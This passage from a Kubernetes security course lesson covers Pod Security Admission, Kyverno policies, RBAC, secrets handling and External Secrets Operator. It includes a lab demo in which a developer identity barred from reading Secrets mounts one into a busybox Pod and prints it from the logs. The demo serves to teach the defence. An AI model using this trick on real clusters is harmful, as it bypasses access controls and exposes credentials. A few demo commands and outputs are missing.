- restricted: current hardening practice. Run as non-root, no privilege escalation, drop all Linux capabilities, use a seccomp profile.

You switch it on per namespace with labels such as `pod-security.kubernetes.io/enforce: baseline`. There are three modes: `enforce` rejects, `warn` shows the user a warning, and `audit` writes to the audit log.

Here is the trap: enforce checks Pods, not Deployments. A Deployment that breaks the rule is accepted, and then its Pods are refused. `kubectl apply` says `configured` and nothing starts. Warn mode does check Deployments, so I set `warn` one level stricter than `enforce`. You see what would break next, before anything does.

Pod Security Admission covers Pod hardening and nothing else. Your own rules need a policy engine. Think of rules such as "no `:latest` tags" or "every workload has a team label". With **policy as code**, those rules are files in git: reviewed in pull requests, tested in CI, and enforced by an admission controller.

There are two common engines:
- Kyverno. Policies are Kubernetes YAML, and the checks are written in CEL, the short expression language Kubernetes itself uses. Kyverno became a CNCF graduated project in March 2026.
- OPA Gatekeeper. Policies are written in Rego, a general policy language, as ConstraintTemplates, and switched on as Constraints. A good fit where a company already uses OPA.

For a Kubernetes-only team I would pick Kyverno, because its policies look like the YAML you already write. One warning before you search the web: most Kyverno tutorials use `kind: ClusterPolicy`. [Kyverno 1.19](https://github.com/kyverno/website/blob/main/src/content/blog/announcing-kyverno-release-1.19/index.md) (August 2026) deprecated ClusterPolicy, and removal is planned for 1.20. The lab uses the CEL-based `ValidatingPolicy`.

Read `policy/disallow-latest-tag.yaml` in Files from the top:
- `validationActions: [Deny]` rejects a bad request. `Audit` lets it through and records a failure in a PolicyReport.
- `matchConstraints` picks namespace hello, and Pods plus the workloads that create Pods.
- `variables` finds the Pod spec inside any of those objects.
- `validations` are CEL expressions that must be true, each with a message for the user.

Roll out every new rule the same way: Audit first, read the reports, fix what fails, then switch to Deny.

sections.body:
Here is Part 13 as a list you can tick. Each item is something you can show with one command or one file:
1. No secrets in history: `gitleaks git -v` finds nothing, and push protection is on.
2. Pinned CI: every third-party action uses a full commit SHA, and Dependabot watches them.
3. Least-privilege CI: every workflow declares `permissions:`, and only the release job may write packages and attestations.
4. Known contents: every release has an SBOM, a passing scan and a signature, and `security/verify-release.sh` passes.
5. Secrets from a store: no Secret with a real value in git. ESO or Sealed Secrets creates them.
6. Narrow identities: each app has its own ServiceAccount, no token is mounted where it is not needed, and no Role uses `*`.
7. Hardened Pods: namespace hello warns on the restricted standard, and the hello-devops Deployment passes it.
8. Rules at the door: Kyverno denies `:latest`, and audits non-root and team labels.

Day 55 folds this list into your capstone.

lessons.analogy: Think of a club. RBAC is the guest list: it decides who gets in and which rooms each guest may enter. Admission control is the bouncer who also checks what you carry, such as no glass bottles, whoever you are. The secrets manager is the cloakroom, with a ticket for every coat and a log of who took what. Where it breaks: a bouncer can make an exception for a friend. An admission policy treats every request exactly the same, so one typo in a Deny policy can lock out everybody, you included.

steps.say: Create a Secret in namespace hello and read it back. The value comes out base64 encoded, and one command turns it back into the password.
steps.code:
$ kubectl -n hello create secret generic db-password --from-literal=password=hunter2-example
secret/db-password created
$ kubectl -n hello get secret db-password -o jsonpath='{.data.password}'
aHVudGVyMi1leGFtcGxl
$ kubectl -n hello get secret db-password -o jsonpath='{.data.password}' | base64 -d

steps.say: Make a developer identity that may run Pods but has no rule about Secrets at all (`security/rbac-pod-creator.yaml` in Files). Then ask the API server what it may do. `--as` acts as that identity for one request.
steps.code:

role.rbac.authorization.k8s.io/pod-creator created
rolebinding.rbac.authorization.k8s.io/dev-pod-creator created
$ kubectl auth can-i get secrets -n hello --as=system:serviceaccount:hello:dev
no
$ kubectl auth can-i create pods -n hello --as=system:serviceaccount:hello:dev
yes

steps.say: Reading the Secret directly is refused, as the Role intends.
steps.code:
$ kubectl -n hello get secret db-password --as=system:serviceaccount:hello:dev
Error from server (Forbidden): secrets "db-password" is forbidden: User "system:serviceaccount:hello:dev" cannot get resource "secrets" in API group "" in the namespace "hello"

steps.say: Now the same identity creates a Pod that loads the Secret into an environment variable and prints it. The API server accepts it, because creating Pods is allowed. The kubelet fetches the Secret on the Pod's behalf.
steps.code:
$ kubectl -n hello apply --as=system:serviceaccount:hello:dev -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata: {name: peek}
spec:
  restartPolicy: Never
  containers:
    - name: peek
      image: busybox:1.37
      command: ["sh", "-c", "echo The password is $PASSWORD"]
      env:
        - {name: PASSWORD, valueFrom: {secretKeyRef: {name: db-password, key: password}}}
EOF
pod/peek created

steps.say: Read the Pod's log, still as the developer. The password that the RBAC rule was meant to protect is right there.
steps.code:
$ kubectl -n hello logs peek --as=system:serviceaccount:hello:dev
The password is hunter2-example

secret "db-password" deleted from hello namespace

code.title: policy/disallow-latest-tag.yaml
code.src:
# Kyverno policy: every container image needs a fixed tag or a digest, and never :latest.
#
# Type: ValidatingPolicy (policies.kyverno.io/v1), the CEL-based type.
# The older ClusterPolicy type is deprecated since Kyverno 1.19, so the course does not use it.
# Scope: only namespace hello.
#
# Apply:  kubectl apply -f policy/disallow-latest-tag.yaml
# Check:  kubectl get validatingpolicies
# Try it: kubectl -n hello run test --image=nginx:latest   (Kyverno rejects it)
apiVersion: policies.kyverno.io/v1
kind: ValidatingPolicy
metadata:
  name: disallow-latest-tag
spec:
  # Deny = reject the request. Audit = allow it, but record a failure in a PolicyReport.
  validationActions:
    - Deny
  matchConstraints:
    # Kubernetes puts this label on every namespace, so it selects namespace hello only.
    namespaceSelector:
      matchLabels:
        kubernetes.io/metadata.name: hello
    # Check Pods, and also the workloads that create Pods.
    # Then a bad Deployment fails at "kubectl apply" time, not later in a ReplicaSet event.
    resourceRules:
      - apiGroups: [""]
        apiVersions: [v1]
        operations: [CREATE, UPDATE]
        resources: [pods]
      - apiGroups: [apps]
        apiVersions: [v1]
        operations: [CREATE, UPDATE]
        resources: [deployments, statefulsets, daemonsets]
      - apiGroups: [batch]
        apiVersions: [v1]
        operations: [CREATE, UPDATE]
        resources: [jobs, cronjobs]
  variables:
    # Find the Pod spec inside the object:
    # a CronJob has it at spec.jobTemplate.spec.template.spec,
    # a Deployment, StatefulSet, DaemonSet or Job at spec.template.spec,
    # and a Pod at spec.
    - name: podSpec
      expression: >-
        object.spec.?jobTemplate.?spec.?template.?spec.orValue(
        object.spec.?template.?spec.orValue(object.spec))
    # All containers, including init containers.
    - name: containers
      expression: >-
        variables.podSpec.containers +
        variables.podSpec.?initContainers.orValue([])
  validations:
    # Look only at the part after the last "/". It must contain ":" (a tag),
    # or the image must use "@" (a digest). The "/" matters: in
    # localhost:5000/hello-devops the ":" belongs to the registry port, not a tag.
    - expression: >-
        variables.containers.all(c,
        c.image.substring(c.image.lastIndexOf('/') + 1).contains(':') ||
        c.image.contains('@'))
      message: "Every image needs a tag or a digest, for example hello-devops:1.2.0."
    - expression: >-
        variables.containers.all(c, !c.image.endsWith(':latest'))
      message: "The :latest tag is not allowed. Use a fixed version tag, for example 1.2.0."

code.title: policy/require-run-as-nonroot.yaml
code.src:
# Kyverno policy: every container must promise to run as a non-root user.
# This is one rule of the Kubernetes "restricted" Pod Security Standard.
#
# Type: ValidatingPolicy (policies.kyverno.io/v1), the CEL-based type.
# Mode: Audit. Nothing is blocked. Failures show up in a PolicyReport, so you can
# fix what fails first and switch to Deny later.
# Scope: only namespace hello.
#
# Apply: kubectl apply -f policy/require-run-as-nonroot.yaml
# Read:  kubectl -n hello get policyreports -o wide
apiVersion: policies.kyverno.io/v1
kind: ValidatingPolicy
metadata:
  name: require-run-as-nonroot
spec:
  validationActions:
    - Audit
  # Also check objects that already exist, not only new requests.
  evaluation:
    background:
      enabled: true
  matchConstraints:
    namespaceSelector:
      matchLabels:
        kubernetes.io/metadata.name: hello
    resourceRules:
      - apiGroups: [""]
        apiVersions: [v1]
        operations: [CREATE, UPDATE]
        resources: [pods]
      - apiGroups: [apps]
        apiVersions: [v1]
        operations: [CREATE, UPDATE]
        resources: [deployments, statefulsets, daemonsets]
      - apiGroups: [batch]
        apiVersions: [v1]
        operations: [CREATE, UPDATE]
        resources: [jobs, cronjobs]
  variables:
    # The Pod spec: at spec (Pod), spec.template.spec (Deployment and friends)
    # or spec.jobTemplate.spec.template.spec (CronJob).
    - name: podSpec
      expression: >-
        object.spec.?jobTemplate.?spec.?template.?spec.orValue(
        object.spec.?template.?spec.orValue(object.spec))
    - name: containers
      expression: >-
        variables.podSpec.containers +
        variables.podSpec.?initContainers.orValue([])
    # The Pod-level setting. Containers inherit it unless they set their own.
    - name: podNonRoot
      expression: >-
        variables.podSpec.?securityContext.?runAsNonRoot.orValue(false)
  validations:
    # Pass when the Pod does not say false, and every container ends up with
    # runAsNonRoot: true, either its own setting or the one inherited from the Pod.
    # A container that sets false fails, even when the Pod says true.
    - expression: >-
        variables.podSpec.?securityContext.?runAsNonRoot.orValue(true) == true &&
        variables.containers.all(c,
        c.?securityContext.?runAsNonRoot.orValue(variables.podNonRoot) == true)
      message: >-
        Set securityContext.runAsNonRoot: true on the Pod (spec.template.spec in a
        Deployment), or on every container.

code.title: security/rbac-pod-creator.yaml
code.src:
# A "developer" identity that may run Pods in namespace hello, but may NOT read Secrets.
# Day 53 uses it to show a trap: anyone who can create a Pod in a namespace can
# mount any Secret of that namespace into it, and so read the Secret anyway.
#
# Apply: kubectl apply -f security/rbac-pod-creator.yaml
# Test:  kubectl auth can-i get secrets -n hello --as=system:serviceaccount:hello:dev    (no)
#        kubectl auth can-i create pods -n hello --as=system:serviceaccount:hello:dev    (yes)
# Clean: kubectl delete -f security/rbac-pod-creator.yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: dev
  namespace: hello
# Nothing runs as this account inside the cluster, so do not mount its token into Pods.
automountServiceAccountToken: false
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: pod-creator
  namespace: hello
rules:
  # Run, look at and remove Pods, and read their logs. No rule mentions Secrets.
  - apiGroups: [""]
    resources: [pods]
    verbs: [get, list, watch, create, delete]
  - apiGroups: [""]
    resources: [pods/log]
    verbs: [get]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: dev-pod-creator
  namespace: hello
subjects:
  - kind: ServiceAccount
    name: dev
    namespace: hello
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: pod-creator

code.title: security/external-secret-fake.yaml
code.src:
# External Secrets Operator (ESO) practice, with no cloud account (Day 53).
#
# A SecretStore says WHERE secrets live. An ExternalSecret says WHICH values to copy
# into a normal Kubernetes Secret, and how often to refresh them.
#
# This file uses ESO's "fake" provider: it returns the values written below.
# That is for practice only. In real life the values live in a secrets manager
# (Vault, OpenBao, AWS Secrets Manager and so on), and this file holds only the
# store address and the key names, so it is safe to commit.
#
# Needs: ESO installed (Day 53 shows the Helm command).
# Apply: kubectl apply -f security/external-secret-fake.yaml
# Check: kubectl -n hello get externalsecret hello-api-token
#        kubectl -n hello get secret hello-api-token -o jsonpath='{.data.API_TOKEN}' | base64 -d
apiVersion: external-secrets.io/v1
kind: SecretStore
metadata:
  name: fake-store
  namespace: hello
spec:
  provider:
    fake:
      data:
        # Pretend this is the secrets manager. Two versions of the same key,
        # like a password before and after a rotation.
        - key: /hello-devops/api-token
          value: demo-token-v1
          version: v1
        - key: /hello-devops/api-token
          value: demo-token-v2
          version: v2
---
apiVersion: external-secrets.io/v1
kind: ExternalSecret
metadata:
  name: hello-api-token
  namespace: hello
spec:
  # Fetch again every minute, so a rotated value arrives quickly.
  refreshInterval: 1m
  secretStoreRef:
    kind: SecretStore
    name: fake-store
  # The Kubernetes Secret that ESO creates and keeps up to date.
  target:
    name: hello-api-token
    creationPolicy: Owner # delete the Secret when this ExternalSecret is deleted
  data:
    - secretKey: API_TOKEN # the key inside the Kubernetes Secret
      remoteRef:
        key: /hello-devops/api-token # the key in the secrets manager
        version: v1 # change to v2 to "rotate"

task.title: Lock down namespace hello
steps: Run `gitleaks git -v` in your hello-devops repository. Then make a throwaway repository and commit a fake GitHub token: `ghp_` followed by 36 random letters and digits. Delete it in the next commit, and compare `gitleaks dir` with `gitleaks git`.
Install Kyverno with Helm on your kind cluster and apply `policy/disallow-latest-tag.yaml` and `policy/require-run-as-nonroot.yaml`.
Run `kubectl -n hello run test --image=nginx:latest` and read the message. Try again with `busybox:1.37`, then delete the test Pod.
Read the PolicyReports in namespace hello. Which workloads fail the non-root rule, and why?
Label namespace hello with `warn=restricted` and `enforce=baseline`, re-apply `k8s/deployment.yaml`, and read the Pod Security warning.

Harden the hello-devops Deployment: a Pod `securityContext` with `runAsNonRoot: true` and a `RuntimeDefault` seccomp profile, and a container `securityContext` that blocks privilege escalation and drops all capabilities. Apply until the warning is gone.

Install External Secrets Operator with Helm, apply `security/external-secret-fake.yaml` and decode the Secret it creates. Change `version: v1` to `v2`, apply, and watch the value change within a minute.
hints: The warning lists every missing field, for example `allowPrivilegeEscalation != false` and `seccompProfile`. Fix them one at a time. The image already runs as user 10001 (Day 16), so `runAsNonRoot: true` works without `runAsUser`.

explain_back.prompt: Explain in 3 to 4 sentences how a password should travel from its owner to the hello-devops Pod, and who can read it on the way. Mention git, the secrets manager, RBAC and admission.
explain_back.answer: The password never goes into git; it lives in a secrets manager, and git holds only an ExternalSecret that names the key. External Secrets Operator fetches the value and writes a normal Kubernetes Secret in the namespace, where it is only base64 encoded. So RBAC matters twice: who may read Secrets, and who may create Pods in that namespace, because a Pod creator can mount and print any Secret there. Admission policies such as Pod Security and Kyverno then check every Pod that wants to use it, so a risky Pod is rejected before it ever runs.

interview.q: How do you manage secrets for applications on Kubernetes?
interview.a: I keep the real values in a secrets manager, such as Vault, OpenBao or the cloud provider's service, and never in git. External Secrets Operator syncs them into Kubernetes Secrets on a timer, so rotation happens in one place. In the cluster I turn on encryption at rest, limit who can read Secrets or create Pods per namespace, and give each app its own ServiceAccount. On the developer side, gitleaks runs as a pre-commit hook and push protection is on, and a leaked value is always rotated, not only deleted.

interview.q: What is the difference between RBAC and an admission policy engine like Kyverno?
interview.a: RBAC is authorization: it decides whether an identity may use a verb on a resource type, for example create Deployments in a namespace. Admission control runs after that and looks at the object itself, for example whether its image uses `:latest` or its Pod runs as root. Kyverno and Gatekeeper plug into admission and let you write those rules as code. You need both: Kyverno's own docs say it does not replace RBAC.

interview.q: How would you roll out a new security policy without breaking teams?
interview.a: I write it as code in git, with test cases for good and bad objects, and review it like any change. I deploy it in Audit mode, scoped to the namespaces it is meant for, and read the PolicyReports to see what would fail. I share the results with the owning teams, help them fix their manifests, and add exceptions only with a reason and an owner. When the reports are clean, I switch to Deny, and I watch the policy engine's health because it now sits in the deploy path.

deeper.body:
Two tools from today deserve a closer look before you use them at work.

Kubernetes has its own CEL policies. Since Kubernetes 1.30, ValidatingAdmissionPolicy is built in and stable. You write CEL validations in one object and bind them to resources with a ValidatingAdmissionPolicyBinding. The API server then runs them itself, with no webhook. Kyverno's ValidatingPolicy is a superset of it. It adds background scans of existing objects, PolicyReports, exceptions, a CLI for tests, and calls to outside data. Kyverno can even generate a built-in ValidatingAdmissionPolicy from a simple ValidatingPolicy, so the API server evaluates it. I tested the CEL in the lab's two policies exactly that way. I copied the expressions into a built-in policy on a test API server and sent it 17 test objects. It denied `nginx:latest`, a bare `nginx`, `localhost:5000/hello-devops` with no tag, and a `:latest` init container. It allowed a digest, a registry port with a tag, and anything in other namespaces. That is a cheap habit worth copying: test a policy against good and bad examples before it guards a real cluster. In CI, the Kyverno CLI does the same job with `kyverno apply` and `kyverno test`.

Admission webhooks have a cost. Kyverno and Gatekeeper run as webhooks: the API server calls them over the network for every matching request. If the webhook is down and its failure policy is Fail, matching requests fail too, including your own fixes. If the failure policy is Ignore, requests pass unchecked while it is down. Neither is free. Three habits help:
- Match only the resources and namespaces a policy needs. Never match everything in the cluster.
- Run more than one replica of the policy engine in production, and watch its health in Prometheus like any other service.
- Keep the policy engine's own namespace and kube-system out of its rules, so you can always repair the cluster.

Gatekeeper takes a different shape. A ConstraintTemplate holds Rego code and declares a new kind of object, for example one for required labels. A Constraint of that kind then says where the rule applies and with which parameters, and Gatekeeper ships a shared library of ready-made templates. Rego is a real language with a learning curve. In return, the same OPA engine also decides for Terraform, Docker, SSH and your own APIs, which is why companies that already use OPA tend to stay with Gatekeeper.
